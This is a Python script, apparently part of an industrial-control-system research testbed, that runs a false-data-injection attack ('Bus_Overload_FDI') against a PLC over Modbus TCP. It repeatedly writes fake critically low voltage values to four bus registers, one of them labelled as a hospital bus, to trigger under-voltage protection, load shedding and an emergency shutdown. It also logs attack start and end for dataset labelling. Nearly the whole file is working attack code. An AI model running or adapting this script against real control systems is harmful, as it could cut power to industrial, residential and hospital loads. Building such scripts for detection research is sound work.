"""
Attack #13: Bus_Overload_FDI (Bus Overload - False Data Injection)
====================================================================
Target register: HR8-HR11 (Bus voltages: v_sub, v_ind, v_res, v_com)
Technique: Reports all bus voltages as critically low, triggering
           under-voltage protection and forcing an emergency shutdown.
Effect: The PLC sees a "voltage collapse" on every bus, engages the
        capacitor, sheds load, and raises alarms - even though nothing
        is actually wrong.
MITRE ATT&CK for ICS: T0855 - Unauthorized Command Message
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR8_V_SUB, HR9_V_IND, HR10_V_RES, HR11_V_COM,
    ATTACK_LOOP_DELAY,
    LABEL_BUS_OVERLOAD
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
FAKE_VOLTAGES = {
    HR8_V_SUB:  850,    # 0.850 pu - transformer bus critically low
    HR9_V_IND:  830,    # 0.830 pu - industrial bus critically low
    HR10_V_RES: 810,    # 0.810 pu - residential bus critically low
    HR11_V_COM: 820,    # 0.820 pu - hospital bus critically low
}

ATTACK_NAME = "Bus_Overload_FDI"
ATTACK_ID   = LABEL_BUS_OVERLOAD


def run_attack(duration_sec=600, label_manager=None):
    """
    Bus overload FDI attack.
    Reports all bus voltages (HR8-11) as critically low, triggering
    protection mechanisms across the board.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: HR{HR8_V_SUB}-HR{HR11_V_COM} (4 bus voltages)")
    for hr, val in FAKE_VOLTAGES.items():
        print(f"  Injected: HR{hr} -> {val} ({val/1000:.3f} pu)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        details = ", ".join(f"HR{hr}={v}" for hr, v in FAKE_VOLTAGES.items())
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME, details)

    start_time = time.time()
    packet_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                for hr_addr, fake_val in FAKE_VOLTAGES.items():
                    client.write_register(address=hr_addr, value=fake_val)
                    packet_count += 1
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [BUS] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 400 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                print(f"  [BUS] packet #{packet_count} | "
                      f"4 buses -> critically low | "
                      f"remaining: {remaining:.0f}s")

            time.sleep(ATTACK_LOOP_DELAY)

    except KeyboardInterrupt:
        print("\n  [BUS] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {elapsed:.1f}s"
            )
        print(f"\n  [BUS] Attack finished: {packet_count} packets, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
